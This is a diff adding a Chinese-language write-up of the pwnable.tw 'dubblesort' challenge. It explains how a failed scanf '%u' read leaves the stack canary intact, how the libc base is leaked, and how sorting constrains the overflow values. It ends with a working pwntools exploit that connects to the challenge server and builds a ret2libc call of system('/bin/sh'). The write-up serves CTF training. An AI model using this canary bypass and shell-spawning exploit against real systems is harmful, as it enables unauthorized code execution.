@@ -661,3 +661,131 @@ p.sendline("end")
 p.interactive()
 ```
 
+# dubblesort
+
+## note1. 本题核心在于`scanf`函数:
+
+```
+do
+    {
+      __printf_chk(1, (int)"Enter the %d number : ");
+      fflush(stdout);
+      __isoc99_scanf("%u", v4);                 // 输入无符号整形数据，如果输入f,那么scanf输入失败，原栈上对应位置数据没有改变
+      ++v5;
+      number_copy = number;
+      ++v4;
+    }
+    while ( number > v5 );
+```
+
+由于`scanf`对应`%u`,也就是输入无符号整形数据，那么如果输入非[0-9]，`scanf`输入失败，对应位置的数据没有改变，所以可以在`canary`处，输入`+`或其他字母，来绕过`canary`检查，从而进行栈溢出。
+
+同时需要注意的是，在进行栈溢出操作的时候，直接输入10进制整数即可，`scanf`会自动将10进制数转化为16进制，保存在栈上。
+
+## note2. 关于vmmap的问题：
+
+```
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+0x56555000 0x56556000 r-xp     1000 0      /home/qianfa/Desktop/pwn/pwnabletw/dubblesort_dir/dubblesort
+0x56556000 0x56557000 r--p     1000 0      /home/qianfa/Desktop/pwn/pwnabletw/dubblesort_dir/dubblesort
+0x56557000 0x56558000 rw-p     1000 1000   /home/qianfa/Desktop/pwn/pwnabletw/dubblesort_dir/dubblesort
+0xf7e02000 0xf7e03000 rw-p     1000 0      
+0xf7e03000 0xf7fb3000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so
+0xf7fb3000 0xf7fb5000 r--p     2000 1af000 /lib/i386-linux-gnu/libc-2.23.so
+0xf7fb5000 0xf7fb6000 rw-p     1000 1b1000 /lib/i386-linux-gnu/libc-2.23.so
+0xf7fb6000 0xf7fb9000 rw-p     3000 0      
+0xf7fd4000 0xf7fd5000 rw-p     1000 0      
+0xf7fd5000 0xf7fd8000 r--p     3000 0      [vvar]
+0xf7fd8000 0xf7fd9000 r-xp     1000 0      [vdso]
+0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so
+0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib/i386-linux-gnu/ld-2.23.so
+0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib/i386-linux-gnu/ld-2.23.so
+0xfffdd000 0xffffe000 rw-p    21000 0      [stack]
+
+```
+
+如上所示，其中对应libc的三行:
+
+```
+0xf7e03000 0xf7fb3000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so
+0xf7fb3000 0xf7fb5000 r--p     2000 1af000 /lib/i386-linux-gnu/libc-2.23.so
+0xf7fb5000 0xf7fb6000 rw-p     1000 1b1000 /lib/i386-linux-gnu/libc-2.23.so
+```
+
+第一行就是libc的加载起始地址，第3行对应libc的`.got.plt`的起始地址。
+
+```
+[30] .dynamic          DYNAMIC         001b1db0 1b0db0 0000f0 08  WA  5   0  4
+[31] .got              PROGBITS        001b1ea0 1b0ea0 000150 04  WA  0   0  4
+[32] .got.plt          PROGBITS        001b2000 1b1000 000030 04  WA  0   0  4
+[33] .data             PROGBITS        001b2040 1b1040 000e94 00  WA  0   0 32
+[34] .bss              NOBITS          001b2ee0 1b1ed4 002b3c 00  WA  0   0 32
+```
+
+可以看到本地libc.so的`.got.plt`的偏移地址就是`0x1b2000`，而本题中的`.got.plt`偏移地址是`0x1b0000`：
+
+```
+  [29] .dynamic          DYNAMIC         001afdb0 1aedb0 0000f0 08  WA  5   0  4
+  [30] .got              PROGBITS        001afea0 1aeea0 000150 04  WA  0   0  4
+  [31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4
+  [32] .data             PROGBITS        001b0040 1af040 000e94 00  WA  0   0 32
+```
+
+## note3: 排序问题
+
+由于所有输入最终会进行排序，为了保证canary位置的值不被改变，从canary之后的值都应该大于canary处存放的值:
+
+## note4: exploit:
+
+```
+from pwn import *
+
+debug = int(raw_input("debug?:"))
+
+if debug:
+    p = process("./dubblesort")
+    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
+    context.log_level = "debug"
+    libc_off = 0x1b2000
+else:
+    p = remote("chall.pwnable.tw", 10101)
+    libc = ELF("./libc_32.so.6")
+    context.log_level = "debug"
+    libc_off = 0x1b0000
+
+p.recvuntil("name :")
+p.sendline("aaaa" * 6)
+p.recvuntil("aa\n")
+libc.address = u32("\x00" + p.recvn(3)) - libc_off
+print "libc.address" + hex(libc.address)
+
+p.recvuntil("sort :")
+p.sendline("35")
+for i in range(24):
+    p.recvuntil(" :")
+    p.sendline("0")
+
+p.recvuntil(" :")
+p.sendline("+")
+
+sys_addr = libc.symbols['system']
+bin_sh = next(libc.search("/bin/sh"))
+print "sys" + str(sys_addr)
+print "bin" + str(bin_sh)
+
+for i in range(7):
+    p.recvuntil(" :")
+    p.sendline(str(sys_addr))
+
+p.recvuntil(" :")
+p.sendline(str(sys_addr))
+p.recvuntil(":")
+p.sendline(str(sys_addr))
+p.recvuntil(" :")
+p.sendline(str(bin_sh))
+p.interactive()
+```
+
+
+
